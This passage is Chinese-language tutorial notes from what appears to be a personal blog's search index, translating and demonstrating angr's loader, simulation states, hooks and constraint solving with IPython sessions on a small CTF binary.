&lt;Loaded su_pwn100, maps [0x8048000:0xd008000]&gt; # 查看共享库 In [22]: proj.loader.shared_objects Out[22]: OrderedDict( [('su_pwn100', &lt;ELF Object su_pwn100, maps [0x8048000:0x804a087]&gt;), (u'libc.so.6', &lt;ELF Object libc-2.23.so, maps [0x9000000:0x91b5a1b]&gt;), (u'ld-linux.so.2', &lt;ELF Object ld-2.23.so, maps [0xa000000:0xa024917]&gt;)]) # 查看最小地址 In [23]: proj.loader.min_addr Out[23]: 0x8048000 # 查看最大地址 In [24]: proj.loader.max_addr Out[24]: 0xd008000 # 查看主对象 In [25]: proj.loader.main_object Out[25]: &lt;ELF Object su_pwn100, maps [0x8048000:0x804a087]&gt; # 查看主对象的plt表 In [26]: proj.loader.main_object.plt Out[26]: {u'__gmon_start__': 0x80484f0,  u'__isoc99_fscanf': 0x80484d0,  u'__isoc99_scanf': 0x8048550,  u'__libc_start_main': 0x8048510,  u'exit': 0x8048500,  u'fopen': 0x8048540,  u'printf': 0x80484c0,  u'puts': 0x80484e0,  u'read': 0x80484b0,  u'setvbuf': 0x8048530,  u'strcmp': 0x80484a0,  u'write': 0x8048520}  # 查看pic开启情况  In [27]: proj.loader.main_object.pic  Out[27]: False  # 查看程序中是否存在可执行栈  In [28]: proj.loader.main_object.execstack  Out[28]: False   工厂   在angr中有许多类，并且他们大多数都需要一个工程来实例化。我们提供project.factory，其中对常见的对象提供了许多可用的构造器，我们可以经常使用，而不是使你随处乱晃-_-。 这一节也会作为许多基础的angr概念的介绍。   块   首先，我们有project.factory.block()，可以用来解析给定地址的代码基本块。这是一个重要的事实-angr分析代码是以块为单位的，你会获得一个块对象，可以给你提供许多有趣的信息。   # 获取入口点的块 In [55]: block = proj.factory.block(proj.entry) # 块信息，大小 In [56]: block Out[56]: &lt;Block for 0x8048560, 33 bytes&gt; # pretty-print 查看汇编代码 In [57]: block.pp() 0x8048560:\txor\tebp, ebp 0x8048562:\tpop\tesi 0x8048563:\tmov\tecx, esp 0x8048565:\tand\tesp, 0xfffffff0 0x8048568:\tpush\teax 0x8048569:\tpush\tesp 0x804856a:\tpush\tedx 0x804856b:\tpush\t0x8048830 0x8048570:\tpush\t0x80487c0 0x8048575:\tpush\tecx 0x8048576:\tpush\tesi 0x8048577:\tpush\t0x8048724 0x804857c:\tcall\t0x8048510 # 查看块的指令数量大小 In [61]: block.instructions Out[61]: 0xd # 指令地址 In [62]: block.instruction_addrs Out[62]: [0x8048560L, 0x8048562L, 0x8048563L, 0x8048565L,  0x8048568L, 0x8048569L, 0x804856aL, 0x804856bL,  0x8048570L, 0x8048575L, 0x8048576L, 0x8048577L,  0x804857cL]   状态   这儿是关于angr的另一个事实，Project对象仅仅代表了程序的初始化镜像。当你使用angr操作执行时，你操作的都是一种特殊的对象即代表了一个模拟的程序状态对象SimState。   In [71]: state = proj.factory.entry_state() # 获取程序入口点的状态 In [72]: state Out[72]: &lt;SimState @ 0x8048560&gt;   SimState包含了一个程序的内存，寄存器，文件流数据等等。任何可以被执行更改的活数据在程序中都有一个状态。我们会讲怎样去和这些状态进行交互，但是现在，让我们使用state.regs和state.mem来获取寄存器内容和内存。   # 获取当前状态的eip In [101]: state.regs.eip Out[101]: &lt;BV32 0x8048560&gt; # 获取ebx寄存器 In [102]: state.regs.ebx Out[102]: &lt;BV32 reg_14_5_32{UNINITIALIZED}&gt; # 获取内存，转化为int型 In [104]: state.mem[proj.entry].int.resolved Out[104]: &lt;BV32 0x895eed31&gt;   这些不是python整形，是位向量，用来代表CPU的运行数据，每个位向量都有length属性获取宽度。 我们马上就要知道怎么去使用这些数据了，但是现在，可以尝试将python的int型转成位向量。   # 产生位向量，32位的值是0x1234 In [112]: bv = state.solver.BVV(0x1234,32) Out[113]: &lt;BV32 0x1234&gt; # 求解位向量 In [114]: state.solver.eval(bv) Out[114]: 0x1234   你们也可以将值存储到寄存器和内存中，或者你可以直接使用python的int，它会被转换成适当大小的位向量。   # 将位向量直接打入寄存器 In [124]: state.regs.esi = state.solver.BVV(0x12345678,32) Out[125]: &lt;BV32 0x12345678&gt; # 将python的int值直接赋给内存中 In [126]: s = state.mem[0x200] Out[127]: &lt;&lt;untyped&gt; &lt;unresolvable&gt; at 0x200&gt; In [128]: s.long = 0x5000 In [131]: s.int.resolved Out[131]: &lt;BV32 0x5000&gt;   关于mem接口是令人困惑的，因为他使用了python魔法。怎样使用：使用数组和下标的样式来访问地址；使用.&lt;type&gt;来指定某块内存被解释成某种特定的类型。除此之外，均可使用位向量或python类型来给其赋值，使用.resolved来获取位向量值，使用.concrete来获取python变量类型。更多的用法将在以后提及。对于寄存器而言，会有一些奇怪的变量，如下所示。   In [135]: state.regs.edi Out[135]: &lt;BV32 reg_24_10_32{UNINITIALIZED}&gt;   这是一个32位的向量，但是它不包含任何数值类型的值，而且它有个名字。这叫做符号变量，是在符号执行的基础上产生的。别慌，我们过两章就会讨论到了。   仿真管理器   如果一个状态及时反映了给定时间的程序运行，这就必须有一种方式来及时得到下一个状态。仿真模拟器是在angr中首选的接口来进行执行或模拟操作，无论你干什么，都必须和状态有关。作为一个简短的介绍，让我们展示当我向前一段基本块后怎样标记我们之前访问过的一个状态。 首先，我们创建仿真模拟器，构造器的参数可以是一个状态或状态列表。   In [5]: state = proj.factory.entry_state() Out[6]: &lt;SimState @ 0x8048560&gt;  In [7]: simgr = proj.factory.simulation_manager(state) Out[8]: &lt;SimulationManager with 1 active&gt;  In [20]: simgr.active[0] Out[20]: &lt;SimState @ 0x8048560&gt;   仿真管理器可以包含许多状态的藏物（stash），默认的藏物是activate，是由我们已经通过的状态来初始化的。我们可以查看simgr.activate[0]来查看原始状态。 现在，准备好，我们开始执行。   In [18]: simgr.step() Out[18]: &lt;SimulationManager with 1 active&gt;   我们刚刚对一个基本块进行了符号执行操作。我们可以对激活藏物（activate stash）再次查看，注意到它已经被修改了，但是他的原始状态并没有被修改。你可以安全的使用一个单独的状态作为基础态，然后进行多轮复杂的执行。   # 新的状态 In [21]: simgr.active[0].regs.eip Out[21]: &lt;BV32 0x8048510&gt; # 原始状态 In [22]: state.regs.eip Out[22]: &lt;BV32 0x8048560&gt;   分析   angr中有许多内置的分析工具，你可以用他们来解析一些有趣的信息proj.analyses.包括CFG等等，更多的文档在angr的API文档中有提及。这有个简单的例子告诉你怎么构建控制流图CFG。   In [11]: proj = angr.Project('./su_pwn100', auto_load_libs=False) In [12]: cfg = proj.analyses.CFGFast() # cfg.graph是networkx DiGraph 实例，参考networkx APIs来使用 In [13]: cfg.graph Out[13]: &lt;networkx.classes.digraph.DiGraph at 0x7f9056bfaed0&gt; # 获取给定地址的CFGNode In [14]: entry_node = cfg.get_any_node(proj.entry)  In [16]: list(cfg.graph.successors(entry_node)) Out[16]: [&lt;CFGNode 0x8048510[6]&gt;]   又怎么了   现在，你已经知道了许多重要的angr概念：基础块、状态、位向量、仿真管理器和分析。不过，除了把angr当作调试器外，你甚至不能做其他有意思的事情。继续读把，你会解锁更深层次的能力。  ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2018-04/angrDocPart-1.html",
        "teaser":null},{
        "title": "Angrdocpart 2",
        "excerpt":"     angr 文档自理解式翻译 从angr第二章第二节开始 加载二进制文件-CLE和angr工程    加载文件   之前，你看见了最赤裸的angr的加载方式，即加载一个文件，不加载共享库。也学习到了proj.loader和其他的东西。现在，我们将探究这些接口的细微差别。 我们简单提及了angr的加载内容，CLE。CLE代表了加载所有东西，主要责任是使angr更容易工作。   加载器   让我们重新加载，然后仔细看看如何和加载器交互。   加载对象   CLE加载器展示了加载对象的全貌，加载并映射到一个单独的地址空间中。每一个文件都被加载器的后端识别以处理各种不同的文件格式。 内存中的对象可能不对应任何一个文件，比如是为了支持本地线程存储，而externs对象用于保证未解析的符号。你可以使用loader.all_objects获取整个CLE已经加载的对象列表等等：   In [18]: proj.loader Out[18]: &lt;Loaded su_pwn100, maps [0x8048000:0xb008000]&gt; # 所有elf对象 In [19]: proj.loader.all_elf_objects Out[19]: [&lt;ELF Object su_pwn100, maps [0x8048000:0x804a087]&gt;] # 列出所以对象 In [20]: proj.loader.all_objects Out[20]: [&lt;ELF Object su_pwn100, maps [0x8048000:0x804a087]&gt;,  &lt;ExternObject Object cle ##externs, maps [0x9000000:0x9008000]&gt;,  &lt;ELFTLSObject Object cle ##tls, maps [0xa000000:0xa00c808]&gt;,  &lt;KernelObject Object cle ##kernel, maps [0xb000000:0xb008000]&gt; ] # 主对象 In [21]: proj.loader.main_object Out[21]: &lt;ELF Object su_pwn100, maps [0x8048000:0x804a087]&gt; # 共享库 In [22]: proj.loader.shared_objects Out[22]: OrderedDict([('su_pwn100', &lt;ELF Object su_pwn100, maps [0x8048000:0x804a087]&gt;)]) # 查看某个地址属于的对象 In [33]: proj.loader.find_object_containing(0x9000000) Out[33]: &lt;ExternObject Object cle##externs, maps [0x9000000:0x9008000]&gt;   我们可以直接和这些对象进行交互，以获得我们想要的元数据：   In [38]: obj = proj.loader.main_object # 入口点 In [39]: obj.entry Out[39]: 0x8048560 # 最低地址 In [40]: obj.min_addr Out[40]: 0x8048000 # 最高地址 In [41]: obj.max_addr Out[41]: 0x804a087  In [42]: obj.segments Out[42]: &lt;Regions: [&lt;ELFSegment offset=0x0, flags=0x5, filesize=0x9e8, vaddr=0x8048000, memsize=0x9e8&gt;, &lt;ELFSegment offset=0xf08, flags=0x6, filesize=0x13c, vaddr=0x8049f08, memsize=0x180&gt;]&gt; # 节 In [43]: obj.sections Out[43]: &lt;Regions: [&lt;Unnamed | offset 0x0, vaddr 0x0, size 0x0&gt;,  &lt;.interp | offset 0x154, vaddr 0x8048154, size 0x13&gt;,  &lt;.note.ABI-tag | offset 0x168, vaddr 0x8048168, size 0x20&gt;,  &lt;.note.gnu.build-id | offset 0x188, vaddr 0x8048188, size 0x24&gt;,  &lt;.gnu.hash | offset 0x1ac, vaddr 0x80481ac, size 0x2c&gt;,  &lt;.dynsym | offset 0x1d8, vaddr 0x80481d8, size 0x100&gt;,  &lt;.dynstr | offset 0x2d8, vaddr 0x80482d8, size 0xb6&gt;,  &lt;.gnu.version | offset 0x38e, vaddr 0x804838e, size 0x20&gt;,  &lt;.gnu.version_r | offset 0x3b0, vaddr 0x80483b0, size 0x40&gt;,  &lt;.rel.dyn | offset 0x3f0, vaddr 0x80483f0, size 0x18&gt;,  &lt;.rel.plt | offset 0x408, vaddr 0x8048408, size 0x60&gt;,  &lt;.init | offset 0x468, vaddr 0x8048468, size 0x23&gt;,  &lt;.plt | offset 0x490, vaddr 0x8048490, size 0xd0&gt;,  &lt;.text | offset 0x560, vaddr 0x8048560, size 0x2d2&gt;,  &lt;.fini | offset 0x834, vaddr 0x8048834, size 0x14&gt;,  &lt;.rodata | offset 0x848, vaddr 0x8048848, size 0x9b&gt;,  &lt;.eh_frame_hdr | offset 0x8e4, vaddr 0x80488e4, size 0x34&gt;,  &lt;.eh_frame | offset 0x918, vaddr 0x8048918, size 0xd0&gt;,  &lt;.init_array | offset 0xf08, vaddr 0x8049f08, size 0x4&gt;,  &lt;.fini_array | offset 0xf0c, vaddr 0x8049f0c, size 0x4&gt;,  &lt;.jcr | offset 0xf10, vaddr 0x8049f10, size 0x4&gt;,  &lt;.dynamic | offset 0xf14, vaddr 0x8049f14, size 0xe8&gt;,  &lt;.got | offset 0xffc, vaddr 0x8049ffc, size 0x4&gt;,  &lt;.got.plt | offset 0x1000, vaddr 0x804a000, size 0x3c&gt;,  &lt;.data | offset 0x103c, vaddr 0x804a03c, size 0x8&gt;,  &lt;.bss | offset 0x1044, vaddr 0x804a060, size 0x28&gt;,  &lt;.comment | offset 0x1044, vaddr 0x0, size 0x2b&gt;,  &lt;.shstrtab | offset 0x106f, vaddr 0x0, size 0x106&gt;,  &lt;.symtab | offset 0x1628, vaddr 0x0, size 0x4f0&gt;,  &lt;.strtab | offset 0x1b18, vaddr 0x0, size 0x32a&gt;]&gt; # 根据地址找段 In [45]: obj.find_segment_containing(obj.entry) Out[45]: &lt;ELFSegment offset=0x0, flags=0x5, filesize=0x9e8, vaddr=0x8048000, memsize=0x9e8&gt; # 根据地址找节 In [46]: obj.find_section_containing(obj.entry) Out[46]: &lt;.text | offset 0x560, vaddr 0x8048560, size 0x2d2&gt; # plt表函数地址 In [56]: obj.plt['write'] Out[56]: 0x8048520 # 反查函数名 In [57]: obj.reverse_plt[0x8048520] Out[57]: u'write'   符号和重定位   当你在使用CLE的时候也可以和符号进行工作，符号是可执行格式的基本概念，将函数名和地址相映射。最简单的方式从CLE中获取符号是使用loader.find_symbol，可以通过名字或者地址，返回一个符号对象。   # 解析read函数 In [15]: proj.loader.find_symbol('read') Out[15]: &lt;Symbol \"read\" in libc.so.6 at 0x90d5b00&gt; # 解析write函数 In [16]: proj.loader.find_symbol('write') Out[16]: &lt;Symbol \"write\" in libc.so.6 at 0x90d5b70&gt; # 解析system函数 In [17]: proj.loader.find_symbol('system') Out[17]: &lt;Symbol \"system\" in libc.so.6 at 0x903ada0&gt;   一个符号最有用的属性是它的名字、所有者和地址，但是符号的地址是模糊的，一个符号有3种地址。.rebased_addr是在全局地址空间中的地址，也就是打印的地址。.linked_addr是相对应链接基址的偏移量。.relative_addr是RVA，相对应目标基地址的偏移量。   In [19]: malloc = proj.loader.find_symbol('malloc') Out[20]: &lt;Symbol \"malloc\" in libc.so.6 at 0x9070f00&gt;  In [21]: malloc.name Out[21]: u'malloc'  In [22]: malloc.owner_obj Out[22]: &lt;ELF Object libc-2.23.so, maps [0x9000000:0x91b5a1b]&gt;  In [23]: malloc.rebased_addr Out[23]: 0x9070f00  In [24]: malloc.linked_addr Out[24]: 0x70f00  In [25]: malloc.relative_addr Out[25]: 0x70f00   除了提供调试信息，符号也支持动态链接，libc提供malloc作为一个导出符号，然后主程序依附它。如果我们让CLE从主程序中给出一个符号，它会说这是一个导入符号。导入符号没有有意义的地址信息，但是他们会提供一个引用符号，指向那个曾经解析他们的符号，用.resolvedby。   # 在主程序中解析，若符号不存在就无解。在loader则使用find_symble来查找 In [43]: main_read = proj.loader.main_object.get_symbol('read') Out[45]: &lt;Symbol \"read\" in su_pwn100 (import)&gt; # 反向解析 In [46]: main_read.resolvedby Out[46]: &lt;Symbol \"read\" in libc.so.6 at 0x90d5b00&gt;   导出和导入符号的联系应该被注册到程序中一块叫重定位的地方。重定位的任务是：当与匹配到导出符号时，将格式化导出符号的地址。我们可以使用obj.relocs来查看重定位表，或者用obj.imports来查看所有的导入符号，这里不存在导出符号。   In [18]: obj.imports Out[18]: {u'__gmon_start__': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4950&gt;,  u'__isoc99_fscanf': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4810&gt;,  u'__isoc99_scanf': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4c10&gt;,  u'__libc_start_main': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f47d0&gt;,  u'exit': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4850&gt;,  u'fopen': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4a50&gt;,  u'printf': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4410&gt;,  u'puts': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4750&gt;,  u'read': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4310&gt;,  u'setvbuf': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f48d0&gt;,  u'strcmp': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4510&gt;,  u'write': &lt;cle.backends.elf.relocation.i386.R_386_JMP_SLOT at 0x7f171f5f4990&gt;}   一个重定位有关的导入符号可以通过.symbol来访问。地址都是通用的，也可以通过.own_obj来访问。 如果一个导入符号不能被任何一个导出符号解析，例如共享库丢失了，CLE会自动声明.loader.extern_obj提供了该导出符号。   加载选项   如果你使用.angr.Project来加载某些东西，并且为加载器提供信息，可以给构造器提供关键的参数，它将会传递给CLE。这里我们将复习一些常用和重要的选项。   基础选项   我们已经讨论过了auto_load_libs，它禁止angr去自动地解析共享依赖关系，默认开启。相对的选项是except_missing_libs，如果开启，当文件的共享库不能被解析时，会产生异常。 你可以给force_load_libs传字符串列表，其中的值将会被视为未被解决的共享库。给skip_libs传参可以阻止某个libs被解析。另外可以使用custom_ld_path自定义共享库的地址。默认的共享库位置是程序的同目录、当前的项目目录、系统共享库。   执行文件前的选项   如果你想要指定一些特殊的参数只应用于特殊的文件时，CLE允许你那样做。参数main_opts和lib_opts使用字典作为选项，main_opts从选项名映射到选项值，lib_opts从库名映射到一个从选项名映射到选项值的字典。 你可以使用的选项有很多，一些常用的如下：backend使用什么后端，类或名；custom_base_addr自定义基址；custom_entry_point自定义入口点；custom_arch自定义架构。例子：   angr.Project(main_opts={'backend': 'ida', 'custom_arch': 'i386'}, lib_opts={'libc.so.6': {'backend': 'elf'}})   后端   CLE当前有许多后端来静态加载elf、pe、cgc、mach-o、elf-dump文件，也可以加载ida文件，把文件加载到平坦内存中。CLE大多数情况下会自动分析当前的文件来选择恰当的后端，我们没必要手动指定，除非你在处理一些特殊的东西。 你可以通过字典选项中的key来强制CLE来使用具体的后端，就如上文所述。一些后端不会自动的指定使用什么类型的架构，所以必须手动指定custom_arch。这个值不需要和angr架构列表中的值匹配，angr会自动识别你指定的架构。关于后端的值可以参考API。一般情况下都不需要指定，在使用ida文件时需要指定。   符号化功能总结   默认的，angr工程尝试将所有的外部调用替换为库函数，通过的这种方式被称作模拟程序-仅仅只有python的函数能高效地模拟这个状态。我们应用了一整套的函数来作为模拟程序，这些内置的函数是在angr.SIM_PROCEDURES中可获得。命名是两级的，第一级是包名，第二级是库函数名。执行这其中的函数而不是你系统中实际的库函数使得分析更加可跟踪，以一些潜在的不准确为代价。 对给定的函数没有这样的总结时：如果auto_load_libs开启，（默认开启）真实的库函数是会执行的，这可能不是你想要的结果，取决于你的工作。例如：有的函数是极端复杂难以分析，如果尝试执行将可能造成路径状态爆炸。如果auto_load_libs关闭，那么外部函数是未解析的，那么工程将会解析他们成为一个一般的模拟程序被叫做ReturnUnconstrained。如名字一样，每次调用将返回一个特殊的无约束的符号值。如果use_sim_procedures（这是angr.Project的参数）关闭，（默认开启）只有由外部对象提供的符号会被替换成模拟程序，又会被替换成ReturnUnconstrained什么都不会做，但是会返回一个符号值。你可以指定一个特殊的符号来防止被中间状态替换，通过angr.Project的exclude_sim_procedures_list和exclude_sim_procedures_func参数。参考angr.Project._register_object来获得准确算法。   hook   hook是用python总结来替代库代码，你也可以自己做。当执行模拟的时候，每一步angr都会检测当前的地址是否被hook，如果被hook，运行hook代码而不是原本地址的代码。你也可以使用proj.hook(addr, hook)API来使用，hook参数是模拟程序实例，你可以管理工程的hooks通过.is_hooked，.unhook和unhook_by。 通过使用一个可以替换的API来hook地址，就能使用自己设置的函数了，即通过proj.hook(addr)作为装饰器。如果你真这么做了，你可以指定一个可选项length关键字当hook结束后来使程序跳转到多少字节远。   In [10]: stub_func = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'] # 地址hook In [11]: proj.hook(0x10000,stub_func) CRITICAL | 2018-04-11 10:50:56,311 | angr.project | Hooking with a SimProcedure class is deprecated! Please hook with an instance. # 地址是否hook In [14]: proj.is_hooked(0x10000) Out[14]: True # 被谁hook In [21]: proj.hooked_by(0x10000) Out[21]: &lt;SimProcedure ReturnUnconstrained&gt; # 接触hook In [15]: proj.unhook(0x10000) # 自定义hook函数，定义完就执行自动hook，立即生效 In [25]: @proj.hook(0x2000, length=5)    ....: def my_hook(state):    ....:     state.regs.eax = 52    ....:      # 检测hook In [26]: proj.is_hooked(0x2000) Out[26]: True # 被谁hook In [31]: proj.hooked_by(0x2000) Out[31]: &lt;SimProcedure UserHook&gt;   更多的是，你可以使用proj.hook_symbol(name, hook)第一个参数提供为符号名，当符号存在时hook地址。一种重要的使用方式就是扩大angr的内置库模拟程序。因为这些库只是类，你可以生成子类，重写他们的行为，并在hook中使用他们的子类。   到目前还好   到现在为止，你应该对分析发生的事进行怎样的控制有了比较合理的理解，在CLE加载器层面和angr工程中。你也应该理解angr使用合理的尝试通过hook复杂的库函数，使用模拟程序总结函数的影响来化简它的分析。 为了掌握所有你可以在CLE加载器中做的事，请参考CLE API文档。  ","categories": [],
        "tags": ["angr"],
        "url": "https://zjgcjy.github.io/posts/2018-04/angrDocPart-2.html",
        "teaser":null},{
        "title": "Angrdocpart 3",
        "excerpt":"   angr 文档自理解式翻译 从angr第二章第三节开始 求解工程    符号表达式和约束求解   angr的能力不仅是能做模拟器，而且能执行被称为符号变量的东西。它保持了一个符号，高效的说就是一个名字，而不是一个具体的数值。之后可以使用变量进行算术操作产生树形操作序列（编译原理中的抽象语法树AST）。AST可以被翻译给SMT求解器进行约束求解，即根据操作的序列输出，得到输入。这里你将学习使用angr来解决这个。   操作位向量   In [1]: import angr, monkeyhex In [2]: proj = angr.Project('./su_pwn100')  In [3]: state = proj.factory.entry_state() Out[4]: &lt;SimState @ 0x8048560&gt;   位向量就是几个bit的序列，用有界限的整数来解释算术。   # 64bit长度值是1的位向量 In [5]: one = state.solver.BVV(1,64) Out[6]: &lt;BV64 0x1&gt; # 64bit长度值是100的位向量 In [7]: one_hundred = state.solver.BVV(100,64) Out[8]: &lt;BV64 0x64&gt; # 27bit长度值是9的位向量 In [9]: weird_nine = state.solver.BVV(9, 27) Out[10]: &lt;BV27 0x9&gt;   我们可以拥有任意长度的向量，我们也可以对其进行算术操作   # 加减运算 In [11]: one + one_hundred Out[11]: &lt;BV64 0x65&gt; # 加减运算 In [12]: one - one_hundred Out[12]: &lt;BV64 0xffffffffffffff9d&gt; # python整数会自动转为相应的位向量 In [14]: one +2 Out[14]: &lt;BV64 0x3&gt; # 乘法就是多个向量相加 In [18]: one_hundred - one*200 Out[18]: &lt;BV64 0xffffffffffffff9c&gt;   我们不能对长度不同的向量进行算术，这会导致类型错误。但是我们可以拓展向量长度使其适当。   In [30]: weird_nine.zero_extend(64 - 27) Out[30]: &lt;BV64 0x9&gt; # 拓展向量长度 In [31]: one + weird_nine.zero_extend(64 - 27) Out[31]: &lt;BV64 0xa&gt;   zero_extend将会填补向量的高位是0，使其长度变长。sign_extend会填补n位，值是当前的最高位值，并将值保持在2的有符号整数内（不理解，我试过了是无符号的。。。）。 现在让我们开始介绍一些符号   # 构造一个64长度的位向量符号 In [52]: x = state.solver.BVS('x', 64) Out[53]: &lt;BV64 x_1_64&gt; # 构造一个64长度的位向量符号 In [54]: y = state.solver.BVS('y', 64) Out[55]: &lt;BV64 y_2_64&gt;   x和y都是符号变量，这是你在7年级学到的变量的一种。注意到你提供的变量名后面跟上了一个增长的数字。无论你做什么都不会得到数字，你只会得到AST。   In [56]: x+ one Out[56]: &lt;BV64 x_1_64 + 0x1&gt;  In [57]: x-y Out[57]: &lt;BV64 x_1_64 - y_2_64&gt;  In [58]: (x+ one)/2 Out[58]: &lt;BV64 (x_1_64 + 0x1) / 0x2&gt;  In [59]: (x+ one)*2 Out[59]: &lt;BV64 (x_1_64 + 0x1) * 0x2&gt;   典型地将，BVV和BVS类型都是AST，所有位向量都是AST操作符，即使树的深度只有一层，为了理解这个，让我们理解如何构建AST。 每个AST都有操作符和参数，即op和args。op是当前进行的操作，args是操作符作用的值。除非op是BVV或者BVS，args是其他AST，树通常以BVV或者BVS结束。   In [71]: tree = (x + 1) / (y + 2) Out[72]: &lt;BV64 (x_1_64 + 0x1) / (y_2_64 + 0x2)&gt;  In [73]: tree.op Out[73]: '__floordiv__'  In [74]: tree.args Out[74]: (&lt;BV64 x_1_64 + 0x1&gt;, &lt;BV64 y_2_64 + 0x2&gt;)  In [75]: tree.args[0].op Out[75]: '__add__'  In [76]: tree.args[0].args Out[76]: (&lt;BV64 x_1_64&gt;, &lt;BV64 0x1&gt;)  In [79]: tree.args[0].args[0].args Out[79]: ('x_1_64', None, None, None, False, False, None)  In [80]: tree.args[0].args[0].op Out[80]: 'BVS'   从这里我们看到，我们用位向量指代任何顶级操作会产生位向量的AST，可以通过AST来表示其他类型的值，包括浮点数，布尔类型，接下来就会看到。   符号约束   在任何两个相似的AST之间进行必将将产生一个新的AST，不是位向量，是符号布尔值。   In [27]: x ==1 Out[27]: &lt;Bool x_0_64 == 0x1&gt;  In [28]: x == one Out[28]: &lt;Bool x_0_64 == 0x1&gt;  In [29]: x &gt;3 Out[29]: &lt;Bool x_0_64 &gt; 0x3&gt;  In [30]: x + y == one_hendred+ 5 Out[30]: &lt;Bool (x_0_64 + y_1_64) == 0x69&gt;  In [31]: one &gt;0 Out[31]: &lt;Bool True&gt; # 和负数比较出错 In [32]: one &gt;-1 Out[32]: &lt;Bool False&gt;   你可以看到，默认的比较方式是无符号的，负数将使用补码表示，所以肯定比正数大，如果我们想要和负数比较，可以使用.SGT(-5)即表示某个BVV或BVS和-5比较，优先级比普通的符号高。 这个小片段也说明了很重要的一点，不要在angr中使用变量的直接比较，如在if表达式或while语句中，因为结果是不准确的。即使有一个准确的值，这种方式会抛出异常，你应该使用solver.is_true和solver.is_false，它测试的是具体的正确或者错误，而不执行约束。   In [52]: maybe = x==y Out[53]: &lt;Bool x_0_64 == y_1_64&gt; # 两个符号比较无意义 In [54]: state.solver.is_true(maybe) Out[54]: False  In [57]: state.solver.is_false(maybe) Out[57]: False   约束求解   你可以将符号布尔值作为对符号变量有效值的一个断言，并将其添加到状态的约束中。之后你就可以查询一个符号变量的值是否有效，通过计算符号变量表达式来进行。例子：   # 添加约束条件 In [58]: state.solver.add(x&gt;y) Out[58]: [&lt;Bool x_0_64 &gt; y_1_64&gt;]  In [59]: state.solver.add(y&gt;2) Out[59]: [&lt;Bool y_1_64 &gt; 0x2&gt;]  In [60]: state.solver.add(x&lt;10) Out[60]: [&lt;Bool x_0_64 &lt; 0xa&gt;] # 计算符号 In [61]: state.solver.eval(x) Out[61]: 0x9L   通过添加这些约束条件，我们强制约束求解器将其作为一个断言，即返回值必须满足所有的条件。如果你不加入更多的约束条件，那么就会得到两个变量的结果，之间具有一致性。 从现在开始，我们很容易就能做这章开头提出来的任务，即给定输出求输入。例子：   In [3]: state = proj.factory.entry_state() In [4]: input = state.solver.BVS('input',32) In [5]: operation = (((input + 4 ) * 3) &gt;&gt; 1) + input In [6]: output = 200  In [7]: state.solver.add(operation == output) Out[7]: [&lt;Bool ((((input_0_32 + 0x4) * 0x3) &gt;&gt; 0x1) + input_0_32) == 0xc8&gt;]  In [8]: state.solver.eval(input) Out[8]: 0x33333381L   请注意，这个方法只适用于位向量，如果我们在整数域上求解就是无解了。 如果我们添加了矛盾或者对立的约束，那么就没有可以分配给这些变量的值以满足约束条件，这个状态就会变得不满足，或unsat，对其的查询将抛出异常。我们可以通过state.satisfiable()来判断约束是否可满足。 从这里我们可以看到，eval是一个通用的方法来将任何位向量转换成python原始变量，同时保持数据完整性。这就是我们为什么用eval将具体的位向量转成python整数的原因。 需要注意的是，变量不与状态进行绑定，定义后任何状态都能访问。   浮点数   z3已经支持IEEE754的浮点数理论，所以angr也支持了。主要的区别是浮点数有种类，而不是宽度。你可以通过FPV和FPS创造浮点数符号。   In [13]: a = state.solver.FPV(3.2, state.solver.fp.FSORT_DOUBLE) Out[14]: &lt;FP64 FPV(3.2, DOUBLE)&gt;  In [15]: b = state.solver.FPS('b', state.solver.fp.FSORT_DOUBLE) Out[16]: &lt;FP64 FPS('FP_b_0_64', DOUBLE)&gt;  In [17]: a + b Out[17]: &lt;FP64 fpAdd('RNE', FPV(3.2, DOUBLE), FPS('FP_b_0_64', DOUBLE))&gt;  In [18]: a + 4.2 Out[18]: &lt;FP64 FPV(7.4, DOUBLE)&gt;  In [19]: b + 2 &lt; 0 Out[19]: &lt;Bool fpLT(fpAdd('RNE', FPS('FP_b_0_64', DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))&gt;   有几点需要说明，对于初学者来说，打印浮点数并不明智，但在过去，大多数操作实际上有第三个参数，但在使用二进制运算时，隐式地添加了舍入模式。IEEE754规范支持多个舍入模式，包括最近舍入，像零舍入，向高位舍入，因此z3支持了这些选项。如果你想要显式的指定舍入模式，请指定第一个参数是solver.fp.RM_*中的值。 约束求解的过程是一样的。   In [22]: state.solver.add(b +2 &lt;0) Out[22]: [&lt;Bool fpLT(fpAdd('RNE', FPS('FP_b_0_64', DOUBLE), FPV(2.0, DOUBLE)), FPV(0.0, DOUBLE))&gt;]  In [23]: state.solver.add(b +2 &gt;-1) Out[23]: [&lt;Bool fpGT(fpAdd('RNE', FPS('FP_b_0_64', DOUBLE), FPV(2.0, DOUBLE)), FPV(-1.0, DOUBLE))&gt;]  In [24]: state.solver.eval(b) Out[24]: -2.4999999999999996   这很好，但是有时候我们需要和位向量下的浮点数打交道。你可以使用方法raw_to_bv和raw_to_fp来进行位向量和浮点数直接的转换，反之亦然。   # 浮点转向量 In [29]: a Out[29]: &lt;FP64 FPV(3.2, DOUBLE)&gt;  In [30]: a.raw_to_bv() Out[30]: &lt;BV64 0x400999999999999a&gt;  In [31]: b Out[31]: &lt;FP64 FPS('FP_b_0_64', DOUBLE)&gt;  In [32]: b.raw_to_bv() Out[32]: &lt;BV64 fpToIEEEBV(FPS('FP_b_0_64', DOUBLE))&gt;  # 向量转浮点 In [34]: state.solver.BVV(0,64).raw_to_fp() Out[34]: &lt;FP64 FPV(0.0, DOUBLE)&gt;  In [35]: state.solver.BVS('x',64).raw_to_fp() 